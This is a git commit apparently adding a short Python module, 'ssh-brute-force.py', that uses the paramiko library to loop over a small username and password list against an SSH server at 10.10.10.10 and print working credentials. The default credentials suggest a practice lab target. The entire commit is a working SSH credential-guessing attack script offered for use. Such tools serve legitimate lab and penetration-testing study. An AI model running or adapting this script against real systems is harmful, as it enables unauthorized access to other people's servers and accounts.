9bea4b4aa824ecd32dbb84d10e571a295897e9c7
Günseli Çolak <48599477+gunselicolak@users.noreply.github.com>
2023-01-28 22:01:20 +0300

    Add files via upload

---
+++ Modules/ssh-brute-force.py
@@ -0,0 +1,13 @@
+import paramiko
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+username_list = ("msfadmin", "password")
+password_list = ("msfadmin", "password")
+for i in username_list:
+    for j in password_list:
+        try:
+            result=client.connect("10.10.10.10", username=i, password=j)
+            client.close()
+            print("Username: ", i, "Password: ", j)
+        except:
+            pass
